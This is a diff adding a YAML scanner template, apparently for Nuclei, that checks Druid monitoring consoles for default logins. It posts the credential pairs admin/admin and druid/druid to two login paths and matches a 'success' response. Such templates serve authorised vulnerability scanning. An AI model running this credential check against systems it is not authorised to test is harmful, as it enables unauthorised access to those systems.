@@ -1,0 +1,41 @@
+id: druid-default-login
+
+info:
+  name: Druid Default Login
+  author: pikpikcu
+  severity: high
+  tags: druid
+
+requests:
+  - raw:
+      - |
+        POST /druid/submitLogin HTTP/1.1
+        Host: {{Hostname}}
+
+        loginUsername={{username}}&loginPassword={{password}}
+
+      - |
+        POST /submitLogin HTTP/1.1
+        Host: {{Hostname}}
+
+        loginUsername={{username}}&loginPassword={{password}}
+
+    payloads:
+      username:
+        - admin
+        - druid
+      password:
+        - admin
+        - druid
+    attack: pitchfork
+
+    matchers-condition: and
+    matchers:
+
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        regex:
+          - "^success$"
